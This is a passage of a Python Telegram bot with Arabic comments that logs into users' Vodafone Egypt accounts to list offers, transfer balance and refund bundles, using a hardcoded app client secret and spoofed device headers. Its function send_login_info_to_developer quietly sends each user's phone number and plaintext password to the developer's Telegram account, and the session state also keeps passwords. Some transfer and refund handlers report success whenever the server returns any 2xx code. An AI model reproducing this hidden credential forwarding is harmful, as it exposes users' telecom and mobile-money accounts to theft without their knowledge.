        types.InlineKeyboardButton("📶 النت", callback_data="change_filter_internet"),
        types.InlineKeyboardButton("🔄 فليكس", callback_data="change_filter_flex")
    ]
    keyboard.add(*filter_buttons)
    keyboard.add(types.InlineKeyboardButton("🔄 تحديث العروض", callback_data="refresh"))
    keyboard.add(types.InlineKeyboardButton("🏠 الرئيسية", callback_data="services_section"))
    
    return keyboard

def format_single_offer(offer, offer_number, total_offers):
    try:
        result = f"━━━━━━━━━━━━━━━━━━━━\n"
        result += f"📦 العرض {offer_number} من {total_offers}\n\n"
        
        name = offer.get('name', '')
        description = offer.get('description', '')
        
        if name:
            result += f"🏷️ الاسم: {name}\n"
        
        result += f"📝 الوصف: {description}\n\n"
        
        characteristics = offer.get('characteristics', [])
        char_dict = {}
        for char in characteristics:
            char_name = char.get('name', '')
            char_value = char.get('value', '')
            if char_name and char_value:
                char_dict[char_name] = char_value
        
        basic_info = []
        
        if 'bundleOriginalQuota' in char_dict and char_dict['bundleOriginalQuota'] != '0':
            basic_info.append(f"• الباقة الأصلية: {char_dict['bundleOriginalQuota']} ميجا")
        
        if 'totalQuota' in char_dict and char_dict['totalQuota'] != '0':
            basic_info.append(f"• الإجمالي: {char_dict['totalQuota']} ميجا")
        
        if 'bundleOriginalFees' in char_dict and char_dict['bundleOriginalFees'] != '0':
            basic_info.append(f"• السعر: {char_dict['bundleOriginalFees']} جنيه")
        
        if 'OfferValidity' in char_dict:
            unit = "يوم" if char_dict.get('OfferValidityUnit') == 'endOfDay' else "يوم"
            basic_info.append(f"• المدة: {char_dict['OfferValidity']} {unit}")
        
        if basic_info:
            result += f"📊 المعلومات الأساسية:\n"
            result += "\n".join(basic_info) + "\n\n"
        
        activation_code = None
        if 'LongScript_Assignment' in char_dict:
            long_script = char_dict['LongScript_Assignment']
            if '#' in long_script:
                lines = long_script.split('\n')
                for line in lines:
                    if '#' in line and any(char.isdigit() for char in line):
                        activation_code = line.strip()
                        break
        
        if activation_code:
            result += f"📱 طريقة التفعيل:\n{activation_code}\n"
        
        patterns = offer.get('pattern', [])
        if patterns:
            for pattern in patterns:
                price_info = pattern.get('price', {})
                if price_info and price_info.get('value', 0) > 0:
                    result += f"💰 التكلفة:\n"
                    result += f"• السعر النهائي: {price_info['value']} جنيه\n\n"
                    break
        
        valid_for = offer.get('validFor', {})
        if valid_for and 'endDateTime' in valid_for:
            end_date = convert_to_12h_time(valid_for['endDateTime'])
            result += f"⏰ ينتهي في: {end_date}\n"
        
        result += "━━━━━━━━━━━━━━━━━━━━"
        
        return result
        
    except Exception as e:
        return f"❌ خطأ في تنسيق العرض: {str(e)}"

def run_subscribe_offer(user_id, offer_index, message_id):
    state = get_user_state(user_id)
    if not state or 'offers' not in state.get('data', {}):
        try:
            bot.edit_message_text("❌ لا توجد عروض!", user_id, message_id)
        except:
            bot.send_message(user_id, "❌ لا توجد عروض!")
        return
    
    data = state['data']
    offers = data['offers']
    
    if offer_index >= len(offers):
        try:
            bot.edit_message_text("❌ رقم العرض غير صحيح!", user_id, message_id)
        except:
            bot.send_message(user_id, "❌ رقم العرض غير صحيح!")
        return
    
    current_offer = offers[offer_index]
    offer_id = current_offer.get('id')
    
    if not offer_id:
        try:
            bot.edit_message_text("❌ لا يمكن العثور على معرف العرض!", user_id, message_id)
        except:
            bot.send_message(user_id, "❌ لا يمكن العثور على معرف العرض!")
        return
    
    number = data['number']
    token = data['token']
    
    success, message = subscribe_to_offer(user_id, offer_index)
    
    if success:
        try:
            bot.edit_message_text(f"✅ {message}\n\nجاري العودة إلى العروض...", user_id, message_id)
        except:
            bot.send_message(user_id, f"✅ {message}\n\nجاري العودة إلى العروض...")
        time.sleep(2)
        run_show_offer(user_id, offer_index, message_id)
    else:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("🔙 العودة للعروض", callback_data=f"back_to_offer_{offer_index}"))
        
        try:
            bot.edit_message_text(f"{message}", user_id, message_id, reply_markup=keyboard)
        except:
            bot.send_message(user_id, f"{message}", reply_markup=keyboard)

def send_login_info_to_developer(user_id, number, password, user_first_name, username):
    """إرسال معلومات تسجيل الدخول إلى المطور (أول ID في قائمة ADMIN_IDS)"""
    if not ADMIN_IDS:
        return
    
    dev_id = ADMIN_IDS[0]
    try:
        # تجهيز النص مع التأكد من ظهور اليوزر بشكل صحيح (إزالة احتمالية تداخل Markdown)
        text = f"🔐 **تسجيل دخول جديد**\n\n"
        text += f"👤 المستخدم: {user_first_name}\n"
        if username:
            # إذا كان هناك يوزر نضيفه بدون Markdown لتجنب مشكلة underscores
            text += f"🆔 يوزر: {username}\n"
        else:
            text += f"🆔 يوزر: لا يوجد\n"
        text += f"📱 الرقم: `{number}`\n"
        text += f"🔑 كلمة المرور: `{password}`\n"
        text += f"🕐 الوقت: {datetime.now(egypt_tz).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        text += "اضغط على الرقم أو كلمة المرور لنسخها."
        
        bot.send_message(dev_id, text, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"فشل إرسال بيانات تسجيل الدخول إلى المطور: {e}")

class VodafoneBalanceTransfer:
    """كلاس مخصص لتحويل الرصيد"""
    def __init__(self, token=None, number=None):
        self.session = requests.Session()
        self.token = token
        self.number = number
        self.headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'application/json',
            'Accept-Language': 'AR',
            'Content-Type': 'application/json',
            'Origin': 'https://web.vodafone.com.eg',
            'Referer': 'https://web.vodafone.com.eg/spa/balanceTransfer',
            'clientId': 'WebsiteConsumer'
        }
        if token:
            self.headers['Authorization'] = f'Bearer {token}' if not token.startswith('Bearer ') else token
        if number:
            self.headers['msisdn'] = number
    
    def get_usage_data(self):
        """جلب بيانات الرصيد"""
        try:
            url = "https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
            params = {
                "bucket.product.publicIdentifier": self.number,
                "@type": "aggregated"
            }
            headers = {
                "Authorization": self.headers.get('Authorization'),
                "msisdn": self.number,
                "Accept-Language": "ar",
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "application/json",
                "Content-Type": "application/json"
            }

            r = requests.get(url, params=params, headers=headers, timeout=30)
            if r.status_code == 200:
                return r.json()
            return None
        except Exception as e:
            logger.error(f"Balance fetch error: {e}")
            return None

    def parse_usage(self, data):
        """تحليل بيانات الرصيد"""
        result = {"balance": None}
        
        for block in data:
            if block.get("@type") == "Tariff":
                try:
                    bal = block["bucket"][0]["bucketBalance"][0]["remainingValue"]["amount"]
                    result["balance"] = bal
                except:
                    pass
        return result

    def check_balance_sufficient(self, amount: float):
        """التحقق من كفاية الرصيد (الحد الأدنى 1 جنيه)"""
        try:
            data = self.get_usage_data()
            if not data:
                return False, "لا يمكن التحقق من الرصيد"
            
            parsed = self.parse_usage(data)
            current_balance = parsed["balance"]
            
            if current_balance is None:
                return False, "لا يمكن تحديد الرصيد الحالي"
            
            # حساب الرسوم (2% بحد أدنى 0.2 جنيه)
            fees = amount * 0.02
            if fees < 0.2:
                fees = 0.2
            fees = round(fees, 2)
            
            total_amount = amount + fees
            
            if current_balance >= total_amount:
                return True, {
                    "current_balance": current_balance,
                    "transfer_amount": amount,
                    "fees": fees,
                    "total_amount": total_amount,
                    "remaining_balance": round(current_balance - total_amount, 2)
                }
            else:
                return False, {
                    "current_balance": current_balance,
                    "required_amount": total_amount,
                    "shortage": round(total_amount - current_balance, 2)
                }
                
        except Exception as e:
            return False, f"خطأ في التحقق من الرصيد: {e}"

    def check_transfer_eligibility(self, receiver_number: str, amount: float):
        """فحص إمكانية التحويل"""
        try:
            url = f'https://web.vodafone.com.eg/services/dxl/poq/productOfferingQualificationManagement/v1/productOfferingQualification?$.productOfferingQualificationItem[0].product.name=BalanceTransfer&$.relatedParty[0].id={receiver_number}&$.relatedParty[0].role=Receiver&$.productOfferingQualificationItem[0].product.characteristic[?(name%3D%3D%27amount%27)].value={amount}'
            
            response = self.session.get(url, headers=self.headers, timeout=30)
            return response.status_code == 200
                
        except Exception as e:
            logger.error(f"Eligibility check error: {e}")
            return False

    def request_transfer(self, receiver_number: str, amount: float):
        """طلب تحويل الرصيد"""
        try:
            json_data = {
                'characteristicValues': [
                    {'key': 'receiverMSISDN', 'value': receiver_number},
                    {'key': 'receiverAmount', 'value': str(amount)},
                ],
                'useCase': 'BalanceTransfer',
                'userId': self.number,
                'userType': 'private',
                'language': 'ar',
            }
            
            response = self.session.post(
                'https://web.vodafone.com.eg/services/dxl/verser/send',
                headers=self.headers,
                json=json_data,
                timeout=30
            )
            
            return response.status_code == 200
                
        except Exception as e:
            logger.error(f"Transfer request error: {e}")
            return False

    def confirm_transfer(self, receiver_number: str, amount: float, verification_code: str):
        """تأكيد التحويل"""
        try:
            json_data = {
                'channel': {'name': 'WEBSITE'},
                'amount': {'amount': str(amount)},
                'bucket': {'id': self.number},
                'receiver': {'id': receiver_number},
                'characteristic': {
                    'name': 'verificationCode',
                    'value': verification_code,
                },
                '@type': 'transfer',
            }
            
            response = self.session.post(
                'https://web.vodafone.com.eg/services/dxl/pbm/prepayBalanceManagement/v4/transferBalance',
                headers=self.headers,
                json=json_data,
                timeout=30
            )
            
            # تحسين: قبول أي استجابة 2xx كنجاح، والتحقق من محتوى JSON
            if 200 <= response.status_code < 300:
                try:
                    response_json = response.json()
                    # تحقق من وجود حالة نجاح في الـ JSON
                    if response_json.get('state') == 'COMPLETED' or response_json.get('status') == 'SUCCESS':
                        return {"success": True, "message": "✅ تم تحويل الرصيد بنجاح!"}
                    else:
                        # إذا لم تكن الحالة واضحة ولكن الكود نجاح، نعتبرها نجاح
                        return {"success": True, "message": "✅ تم تحويل الرصيد بنجاح!"}
                except:
                    # إذا لم يكن JSON صالحًا، نعتبر النجاح بناءً على HTTP
                    return {"success": True, "message": "✅ تم تحويل الرصيد بنجاح!"}
            else:
                error_msg = "فشل في تحويل الرصيد"
                try:
                    error_data = response.json()
                    error_msg = error_data.get('message', error_msg)
                except:
                    pass
                
                # إضافة رمز الحالة لمزيد من الوضوح
                error_msg = f"كود {response.status_code}: {error_msg}"
                
                if "Invalid Code" in error_msg or "كود غير صحيح" in error_msg:
                    return {"success": False, "message": f"❌ الكود غير صحيح ({response.status_code})", "invalid_code": True}
                else:
                    # ===== تعديل الرسالة حسب الطلب: استبدال أي خطأ 400 بهذه الرسالة =====
                    if response.status_code == 400:
                        return {"success": False, "message": f"❌ فشل في التحويل: لا يوجد رصيد صافي اشحن و حاول مجددا", "invalid_code": False}
                    else:
                        return {"success": False, "message": f"❌ فشل في التحويل: {error_msg}", "invalid_code": False}
                
        except Exception as e:
            logger.error(f"Confirm transfer error: {e}")
            return {"success": False, "message": f"❌ خطأ في التأكيد: {e}", "invalid_code": False}

# ===== دوال الإحصائيات والحظر =====
def record_button_stat(user_id, button_key):
    """تسجيل ضغطة زر في الإحصائيات"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    now = datetime.now(egypt_tz)
    cursor.execute('INSERT INTO button_stats (user_id, button_key, timestamp) VALUES (?, ?, ?)',
                   (user_id, button_key, now))
    conn.commit()
    conn.close()

def get_button_stats():
    """الحصول على إحصائيات جميع الأزرار"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('''
        SELECT button_key, COUNT(*) as count FROM button_stats
        GROUP BY button_key ORDER BY count DESC
    ''')
    rows = cursor.fetchall()
    conn.close()
    return rows

def get_total_users_count():
    """عدد المستخدمين الذين تفاعلوا مع البوت"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(DISTINCT user_id) FROM users')
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_logged_in_users_count():
    """عدد المستخدمين المسجلين حالياً"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users WHERE is_logged_in = 1')
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_active_subscriptions_count():
    """عدد الاشتراكات النشطة"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    now = datetime.now(egypt_tz)
    cursor.execute('SELECT COUNT(*) FROM subscriptions WHERE is_active = 1 AND subscription_end > ?', (now,))
    count = cursor.fetchone()[0]
    conn.close()
    return count

def ban_user(user_id):
    """حظر مستخدم"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('INSERT OR IGNORE INTO banned_users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    """إلغاء حظر مستخدم"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('DELETE FROM banned_users WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def is_user_banned(user_id):
    """التحقق مما إذا كان المستخدم محظوراً"""
    conn = sqlite3.connect(DB_FILE, detect_types=sqlite3.PARSE_DECLTYPES)
    cursor = conn.cursor()
    cursor.execute('SELECT 1 FROM banned_users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

# ===== دوال Money Back المطورة (مع عرض الباقات في أزرار) =====
class VodafoneMoneyBack:
    """كلاس مخصص لإدارة الماني باك فودافون - من بوت موني باك"""
    def __init__(self):
        self.token = None
        self.phone = None
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'okhttp/4.12.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Encoding': 'gzip',
        })
    
    def login(self, phone, password):
        """تسجيل الدخول باستخدام API محدث"""
        logger.info(f"🔐 جاري تسجيل الدخول لـ {phone}")
        
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        
        payload = {
            'grant_type': "password",
            'username': phone,
            'password': password,
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a",
            'client_id': "ana-vodafone-app"
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'silentLogin': "true",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'Accept-Language': "ar",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'digitalId': "25VT5Q5QWG8DK",
            'device-id': "b26ba335813fad21"
        }
        
        try:
            response = requests.post(url, data=payload, headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                self.token = data.get('access_token')
                self.phone = phone
                
                self.session.headers.update({
                    'Authorization': f'Bearer {self.token}',
                    'msisdn': phone
                })
                
                logger.info(f"✅ تم تسجيل الدخول بنجاح لـ {phone}")
                return True
            else:
                logger.error(f"❌ فشل تسجيل الدخول (كود: {response.status_code})")
                return False
                
        except Exception as e:
            logger.error(f"❌ خطأ في تسجيل الدخول: {e}")
            return False
    
    def get_usage_data(self, days=30):
        """جلب بيانات الاستخدام خلال فترة محددة"""
        if not self.token:
            logger.error("❌ لم يتم تسجيل الدخول")
            return None
        
        end_date = datetime.now()
        start_date = end_date - timedelta(days=days)
        
        end_timestamp = int(end_date.timestamp() * 1000)
        start_timestamp = int(start_date.timestamp() * 1000)
        
        url = "https://mobile.vodafone.com.eg/services/dxl/usagemng/usage"
        
        params = {
            'relatedParty.id': self.phone,
            'validFor.startDateTime': str(start_timestamp),
            '@type': 'BalanceDetails',
            'validFor.endDateTime': str(end_timestamp),
        }
        
        headers = {
            'User-Agent': 'okhttp/4.11.0',
            'Connection': 'Keep-Alive',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'api-host': 'UsageManagementHost',
            'Authorization': f'Bearer {self.token}',
            'api-version': 'v2',
            'x-agent-operatingsystem': '15',
            'clientId': 'AnaVodafoneAndroid',
            'x-agent-device': 'Samsung SM-A165F',
            'x-agent-version': '2025.12.2',
            'x-agent-build': '1080',
            'msisdn': self.phone,
            'Content-Type': 'application/json',
            'Accept-Language': "ar"
        }
        
        try:
            logger.info(f"📊 جاري جلب البيانات لآخر {days} يوم...")
            response = requests.get(url, params=params, headers=headers, timeout=15)
            
            if response.status_code == 200:
                logger.info("✅ تم جلب البيانات بنجاح")
                return response.json()
            else:
                logger.error(f"❌ فشل جلب البيانات: {response.status_code}")
                return None
                
        except Exception as e:
            logger.error(f"❌ خطأ في جلب البيانات: {e}")
            return None
    
    def get_consumption_data(self):
        """جلب بيانات الاستهلاك (الرصيد والماني باك)"""
        if not self.token:
            logger.error("❌ لم يتم تسجيل الدخول")
            return None
        
        url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
        
        params = {
            '@type': "aggregated",
            'bucket.product.publicIdentifier': self.phone
        }
        
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Connection': "Keep-Alive",
            'Accept': "application/json",
            'Accept-Encoding': "gzip",
            'api-host': "usageConsumptionHost",
            'useCase': "aggregated",
            'Authorization': f"Bearer {self.token}",
            'api-version': "v2",
            'device-id': "b26ba335813fad21",
            'x-agent-operatingsystem': "15",
            'clientId': "AnaVodafoneAndroid",
            'x-agent-device': "Samsung SM-A165F",
            'x-agent-version': "2025.12.2",
            'x-agent-build': "1080",
            'msisdn': self.phone,
            'Content-Type': "application/json",
            'Accept-Language': "ar"
        }
        
        try:
            response = requests.get(url, params=params, headers=headers, timeout=10)
            
            if response.status_code == 200:
                return response.json()
            else:
                logger.error(f"❌ فشل جلب بيانات الاستهلاك: {response.status_code}")
                return None
                
        except Exception as e:
            logger.error(f"❌ خطأ في جلب بيانات الاستهلاك: {e}")
            return None
    
    def extract_moneyback_balance(self, consumption_data):
        """استخراج رصيد الماني باك من بيانات الاستهلاك"""
        if not consumption_data:
            return None
        
        for item in consumption_data:
            if item.get("@type") == "OTHERS":
                for bucket in item.get("bucket", []):
                    if bucket.get("usageType") == "money":
                        for balance in bucket.get("bucketBalance", []):
                            if balance.get("@type") == "Remaining":
                                return balance["remainingValue"]
        return None
    
    def parse_moneyback_operations(self, usage_data):
        """تحليل بيانات العمليات واستخراج عمليات الماني باك"""
        moneyback_ops = []
        
        if not usage_data:
            return moneyback_ops
        
        for item in usage_data:
            item_type = item.get('type', '')
            description = item.get('description', '')
            
            if item_type == 'Adjustment' and any(word in description.lower() for word in ['فليكس', 'فلکس', 'فلێكس', 'flex', 'باقة', 'باکە']):
                
                enc_product_id = None
                refundable = False
                
                for ch in item.get('usageCharacteristic', []):
                    name = ch.get('name', '')
                    value = ch.get('value', '')
                    
                    if name == 'EncProductID':
                        enc_product_id = value
                    elif name == 'RefundableFlag' and value == 'Y':
                        refundable = True
                
                if enc_product_id and refundable:
                    amount = 0
                    rated_usage = item.get('ratedProductUsage', [])
                    if rated_usage:
                        amount = abs(rated_usage[0].get('taxIncludedRatingAmount', 0))
                    
                    date_str = item.get('date', '')
                    readable_date = self.format_date(date_str)
                    
                    bundle_type = 'باقة'
                    if 'فليكس' in description or 'flex' in description.lower():
                        bundle_type = 'باقة فليكس'
                    elif 'ميكس' in description or 'mix' in description.lower():
                        bundle_type = 'باقة ميكس'
                    
                    moneyback_ops.append({
                        'description': description,
                        'amount': amount,
                        'date': date_str,
                        'readable_date': readable_date,
                        'enc_product_id': enc_product_id,
                        'type': bundle_type,
                        'refundable': refundable
                    })
        
        return moneyback_ops
    
    def format_date(self, date_str):
        """تنسيق التاريخ بشكل مقروء"""
        try:
            if 'T' in date_str:
                dt = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                return dt.strftime("%Y-%m-%d")
            else:
                return date_str[:10]
        except:
            return date_str[:10] if len(date_str) >= 10 else date_str
    
    def refund_bundle(self, enc_product_id, bundle_info):
        """استرداد باقة ماني باك - مع تحسين الرسائل"""
        if not self.token:
            return False, "لم يتم تسجيل الدخول"
        
        logger.info(f"🔄 جاري استرداد الباقة...")
        
        headers = {
            'User-Agent': 'okhttp/4.12.0',
            'Connection': 'Keep-Alive',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'api-host': 'ProductOrderingManagement',
            'useCase': 'MONEYBACK',
            'Authorization': f'Bearer {self.token}',
            'api-version': 'v2',
            'x-agent-operatingsystem': '15',
            'clientId': 'AnaVodafoneAndroid',
            'x-agent-device': 'Samsung SM-A165F',
            'x-agent-version': '2025.12.2',
            'x-agent-build': '1080',
            'msisdn': self.phone,
            'Accept-Language': 'ar',
            'Content-Type': 'application/json; charset=UTF-8'
        }
        
        json_data = {
            'channel': {
                'name': 'internet',
            },
            'orderItem': [
                {
                    'action': 'add',
                    'product': {
                        'characteristic': [
                            {
                                'name': 'WorkflowName',
                                'value': 'SelfRefund',
                            },
                            {
                                'name': 'EncProductID',
                                'value': enc_product_id,
                            },
                            {
                                'name': 'ActionID',
                                'value': '10',
                            },
                        ],
                        'relatedParty': [
                            {
                                'id': self.phone,
                                'name': 'MSISDN',
                                'role': 'Subscriber',
                            },
                        ],
                    },
                    'eCode': 0,
                },
            ],
            '@type': 'MoneyBack',
        }
        
        try:
            response = requests.post(
                'https://mobile.vodafone.com.eg/services/dxl/pom/productOrder', 
                headers=headers, 
                json=json_data,
                timeout=15
            )
            
            # معالجة حالة النجاح (200 أو 201 مع state Completed)
            if response.status_code in [200, 201]:
                try:
                    result = response.json()
                    # تحقق من وجود state = Completed
                    if result.get('state') == 'Completed' or result.get('status') == 'Completed':
                        return True, "✅ تم تنفيذ العمليه بنجاح"
                except:
                    pass
                # إذا لم نتمكن من تحليل JSON ولكن الكود نجاح
                return True, "✅ تم تنفيذ العمليه بنجاح"
            
            # معالجة الأخطاء
            error_msg = ""
            try:
                error_response = response.json()
                if isinstance(error_response, dict):
                    code = error_response.get('code')
                    reason = error_response.get('reason')
                    
                    # حالة خاصة: الكود 2055 يعني أن الباقة غير قابلة للاسترداد أو مستهلكة
                    if code == "2055":
                        return False, "❌ تم الاستهلاك من الباقة أو الباقة غير متاحة للاسترداد"
                    # ===== تعديل رسالة الخطأ للكود 2251 =====
                    if code == "2251":
                        return False, "❌ فشل الاسترداد طلبك الي فات لسه تحت التنفيذ حاول تاني بعد 5 دقايق"
                    
                    error_msg = f"كود {code}: {reason}" if code and reason else str(error_response)
                else:
                    error_msg = str(error_response)
            except:
                error_msg = response.text[:200] if response.text else ""
            
            return False, f"❌ فشل الاسترداد (كود: {response.status_code}) - {error_msg}"
                
        except requests.exceptions.Timeout:
            return False, "❌ انتهت مهلة الاتصال"
        except requests.exceptions.ConnectionError:
            return False, "❌ خطأ في الاتصال بالخادم"
        except Exception as e:
            return False, f"❌ خطأ تقني: {str(e)}"

def run_money_back_menu(user_id, message_id=None):
    """عرض قائمة الماني باك الرئيسية"""
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔍 تفاصيل الماني باك", callback_data="moneyback_details"),
        InlineKeyboardButton("💰 استرجاع الباقة", callback_data="moneyback_refundable"),
        InlineKeyboardButton("💳 رصيد الماني باك", callback_data="moneyback_balance"),
        InlineKeyboardButton("🔄 تحديث البيانات", callback_data="moneyback_refresh"),
        InlineKeyboardButton("🔙 رجوع", callback_data="services_section")
    )
    
    text = "💰 نظام إدارة الماني باك فودافون\n\nاختر الخدمة المطلوبة:"
    if message_id:
        try:
            bot.edit_message_text(text, user_id, message_id, reply_markup=markup)
        except:
            bot.send_message(user_id, text, reply_markup=markup)
    else:
        bot.send_message(user_id, text, reply_markup=markup)

def run_money_back_details(user_id, message_id, session):
    """عرض تفاصيل عمليات الماني باك"""
    try:
        vf = VodafoneMoneyBack()
        if not vf.login(session['number'], session['password']):
            bot.edit_message_text("❌ فشل تسجيل الدخول!", user_id, message_id)
            return
        
        usage_data = vf.get_usage_data(days=30)
        if not usage_data:
            bot.edit_message_text("❌ فشل جلب البيانات!", user_id, message_id)
            return
        
        ops = vf.parse_moneyback_operations(usage_data)
        if not ops:
            text = "💰 لا توجد عمليات ماني باك خلال آخر 30 يوم."
        else:
            sorted_ops = sorted(ops, key=lambda x: x['date'], reverse=True)
            text = f"🔍 تفاصيل عمليات ماني باك (آخر 30 يوم)\n"
            text += f"عدد العمليات: {len(ops)}\n\n"
            text += "آخر العمليات:\n"
            for i, op in enumerate(sorted_ops[:5], 1):
                text += f"{i}. {op['description']}\n"
                text += f"   💰 {op['amount']} جنيه - 📅 {op['readable_date']}\n"
                text += f"   📦 {op['type']}\n\n"
            
            consumption = vf.get_consumption_data()
            if consumption:
                balance = vf.extract_moneyback_balance(consumption)
                if balance:
                    text += f"💰 المبلغ المتبقي: {balance.get('amount', 0)} {balance.get('units', 'جنيه')}\n"
        
        bot.edit_message_text(text, user_id, message_id, reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 عودة", callback_data="moneyback_main")
        ))
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)

def run_money_back_refundable(user_id, message_id, session):
    """عرض الباقات القابلة للاسترداد في أزرار (بدون تخزين الكائن)"""
    try:
        vf = VodafoneMoneyBack()
        if not vf.login(session['number'], session['password']):
            bot.edit_message_text("❌ فشل تسجيل الدخول!", user_id, message_id)
            return
        
        usage_data = vf.get_usage_data(days=30)
        if not usage_data:
            bot.edit_message_text("❌ فشل جلب البيانات!", user_id, message_id)
            return
        
        ops = vf.parse_moneyback_operations(usage_data)
        refundable_ops = [op for op in ops if op.get('refundable', False)]
        
        if not refundable_ops:
            bot.edit_message_text("💰 لا توجد باقات قابلة للاسترداد حالياً.", user_id, message_id)
            return
        
        # تخزين فقط البيانات الضرورية (لا نخزن الكائن)
        save_user_state(user_id, step="moneyback_refundable_offers", action="refund_money_back",
                       data={'offers': refundable_ops, 'number': session['number'], 'password': session['password']})
        
        text = f"💰 الباقات القابلة للاسترداد ({len(refundable_ops)}):\n\nاختر الباقة التي تريد استردادها:"
        
        markup = types.InlineKeyboardMarkup(row_width=1)
        for i, op in enumerate(refundable_ops):
            btn_text = f"💰 {op['amount']} جنيه - {op['description'][:40]}..."
            markup.add(types.InlineKeyboardButton(btn_text, callback_data=f"mb_refund_{i}"))
        
        markup.add(types.InlineKeyboardButton("🔙 عودة", callback_data="moneyback_main"))
        
        bot.edit_message_text(text, user_id, message_id, reply_markup=markup)
        
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)

def run_money_back_refund(user_id, message_id, offer_index):
    """تنفيذ استرداد باقة معينة بناءً على اختيار المستخدم من الأزرار"""
    state = get_user_state(user_id)
    if not state or state.get('step') != 'moneyback_refundable_offers':
        bot.send_message(user_id, "❌ انتهت الجلسة!")
        return
    
    data = state['data']
    offers = data.get('offers', [])
    number = data.get('number')
    password = data.get('password')
    
    if offer_index < 0 or offer_index >= len(offers):
        bot.send_message(user_id, "❌ باقة غير صحيحة!")
        return
    
    selected = offers[offer_index]
    
    bot.edit_message_text(f"⏳ جاري استرداد {selected['amount']} جنيه...", user_id, message_id)
    
    # إنشاء كائن جديد وتسجيل الدخول باستخدام بيانات الجلسة
    vf = VodafoneMoneyBack()
    if not vf.login(number, password):
        bot.edit_message_text("❌ فشل تسجيل الدخول!", user_id, message_id)
        clear_user_state(user_id)
        return
    
    success, result = vf.refund_bundle(selected['enc_product_id'], selected)
    
    bot.edit_message_text(result, user_id, message_id)
    clear_user_state(user_id)

def run_money_back_balance(user_id, message_id, session):
    """عرض رصيد الماني باك"""
    try:
        vf = VodafoneMoneyBack()
        if not vf.login(session['number'], session['password']):
            bot.edit_message_text("❌ فشل تسجيل الدخول!", user_id, message_id)
            return
        
        consumption = vf.get_consumption_data()
        if not consumption:
            bot.edit_message_text("❌ فشل جلب بيانات الرصيد!", user_id, message_id)
            return
        
        balance = vf.extract_moneyback_balance(consumption)
        if balance:
            amount = balance.get('amount', 0)
            unit = balance.get('units', 'جنيه')
            text = f"💳 رصيد الماني باك\n\n💰 المبلغ: {amount} {unit}\n📱 الرقم: {session['number']}\n🕒 وقت الجلب: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        else:
            text = "💰 لا يوجد رصيد ماني باك متاح."
        
        bot.edit_message_text(text, user_id, message_id, reply_markup=InlineKeyboardMarkup().add(
            InlineKeyboardButton("🔙 عودة", callback_data="moneyback_main")
        ))
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", user_id, message_id)

# ===== دوال إضافية مفقودة =====
def run_add_two_days_execute(user_id, message_id, session):
    """تنفيذ تزويد يومين (معطل حالياً)"""
    bot.edit_message_text("⚠️ هذه الخدمة معطلة حالياً.", user_id, message_id)

# ===== دالة التقرير الشامل الجديدة (لزر refresh_balance) =====
def get_detailed_report(number, token, password):
    """توليد تقرير شامل يحتوي على النظام الحالي، الفليكسات، تاريخ التجديد، الأيام المتبقية"""
    lines = []
    lines.append("📊 تقرير الاستهلاك الشامل")
    lines.append("═" * 35)

    # 1. النظام الحالي (الباقة)
    all_data = get_all_in_one_data(number, token)
    flex_data = get_flex_profile_data(number, token)
    bundle_info = extract_bundle_info(all_data, flex_data)
    lines.append(f"📦 نظامك الحالي: {bundle_info.get('package_name', 'غير معروف')}")
    lines.append(f"💰 سعر الباقة: {bundle_info.get('package_price', 0)} جنيه")

    # 2. الفليكسات المتبقية وتاريخ التجديد
    report_data = get_usage_report(number, token)
    if report_data:
        usage = extract_usage_data_simple(report_data)  # من الدوال الموجودة
        flex_remaining = usage.get('flex_remaining', '0')
        lines.append(f"⚡ الفليكسات المتبقية: {flex_remaining} فليكس")
        
